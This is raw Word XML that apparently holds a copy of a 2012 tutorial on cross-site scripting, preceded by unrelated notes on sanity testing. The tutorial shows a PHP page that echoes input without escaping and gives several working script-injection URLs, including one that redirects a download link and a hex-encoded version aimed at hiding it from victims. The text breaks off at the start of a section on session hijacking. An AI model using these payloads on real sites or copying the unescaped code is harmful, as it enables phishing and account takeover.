        </w:rPr>
        <w:t>General health checkup.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00D857E6" w:rsidRPr="00584E67" w:rsidRDefault="00B95B28" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Sanity Testing:</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
          <w:b w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>oftware build, with minor changes in code, or functionality, Sanity testing is performed to ascertain that the bugs have been fixed and no further issues are introduced due to these changes.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>sanity test fails, the build is rejected to save the time and costs involved in a more rigorous testing</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00D37992" w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D37992" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Specialized health checkup.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D857E6" w:rsidRPr="00584E67" w:rsidRDefault="00D37992" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>CS and C-</w:t>
      </w:r>
      <w:r w:rsidR="00355597" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1---</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>----</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00C978D7" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4—5—6—7—8—9--10</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="685" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XSS Attack Examples (Cross-Site Scripting Attacks)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="386" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="888888"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="postauthorintro"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="888888"/>
        </w:rPr>
        <w:t>by</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="888888"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="postauthor"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:caps/>
          <w:color w:val="888888"/>
          <w:spacing w:val="18"/>
        </w:rPr>
        <w:t>LAKSHMANAN GANAPATHY</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="888888"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="postdateintro"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="888888"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="888888"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="postdate"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:caps/>
          <w:color w:val="888888"/>
          <w:spacing w:val="18"/>
        </w:rPr>
        <w:t>FEBRUARY 16, 2012</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="009462E1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidR="009462E1" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="DD0000"/>
          </w:rPr>
          <w:t>Tweet</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In the previous article of this series, we explained how to prevent from</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="DD0000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>SQL-Injection attacks</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. In this article we will see a different kind of attack called XXS attacks.</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XSS stands for Cross Site Scripting.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XSS is very similar to SQL-Injection. In SQL-Injection we exploited the vulnerability by injecting SQL Queries as user inputs. In XSS, we inject code (basically client side scripting) to the remote server.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>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Types of Cross Site Scripting</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XSS attacks are broadly classified into 2 types:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="457" w:lineRule="atLeast"/>
        <w:ind w:left="457"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>Non-Persistent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="457" w:lineRule="atLeast"/>
        <w:ind w:left="457"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>Persistent</w:t>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1. Non-Persistent XSS Attack</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In case of Non-Persistent attack, it requires a user to visit the specially crafted link by the attacker. When the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>user visit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the link, the crafted code will get executed by the user’s browser. Let us understand this attack better with an example.</w:t>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lastRenderedPageBreak/>
        <w:t>Example for Non-Persistent XSS</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index.php:</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&lt;?php</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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$name = $_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>GET[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'name'];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"Welcome $name&lt;br&gt;";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"&lt;a href="http://xssattackexamples.com/"&gt;Click to Download&lt;/a&gt;";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?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="457"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Example 1:</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Now the attacker will craft an URL as follows and send it to the victim:</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index.php</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=guest&lt;script&gt;alert('attacked')&lt;/script&gt;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When the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>victim load</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the above URL into the browser, he will see an alert box which says ‘attacked’. Even though this example doesn’t do any damage, other than the annoying ‘attacked’ pop-up, you can see how an attacker can use this method to do several damaging things.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="457"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Example 2:</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For example, the attacker can now try to change the “Target URL” of the link “Click to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Download</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>”. Instead of the link going to “xssattackexamples.com” website, he can redirect it to go “not-real-xssattackexamples.com” by crafting the URL as shown below:</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lastRenderedPageBreak/>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}&lt;/script&gt;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In the above, we called the function to execute on “window.onload”. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Because the website (i.e index.php) first echos the given name and then only it draws the &lt;a&gt; tag.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> So if we write directly like the one shown below, it will not work, because those statements will get executed before the &lt;a&gt; tag is echoed</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index.php</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=&lt;script&gt;var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com"&lt;/script&gt;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Normally an attacker tends not to craft the URL which a human can directly read. So he will encode the ASCII characters to hex as follows.</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index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is same as:</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lastRenderedPageBreak/>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}&lt;/script&gt;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Now the victim may not know what it is, because directly he cannot understand that the URL is crafted and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>their is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> a more chance that he can visit the URL.</w:t>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2. Persistent XSS Attack</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In case of persistent attack, the code injected by the attacker will be stored in a secondary storage device (mostly on a database). The damage caused by Persistent attack is more than the non-persistent attack. Here we will see how to hijack other user’s session by performing XSS.</w:t>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Session</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HTTP protocol is a stateless protocol, which means, it won’t maintain any state with regard to the request and response. All request and response are independent of each other. But most of the web </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>application don’t</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> need this. Once the user has authenticated </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>himself</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, the web server should not ask the username/password for the next request from the user. To do this, they need to maintain some kind of states between the web-browser and web-server which is done through the “Sessions”.</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 xml:space="preserve">When the user login for the first time, a session ID will be created by the web server and it will be sent to the web-browser as “cookie”. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>All the</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> sub-sequent request to the web server, will be based on the “session id” in the cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="440" w:after="147" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>Examples for Persistent XSS Attack</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This sample web application we’ve given below that demonstrates the persistent XSS attack does the following:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="457" w:lineRule="atLeast"/>
        <w:ind w:left="457"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>There are two types of users: “Admin” and “Normal” user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
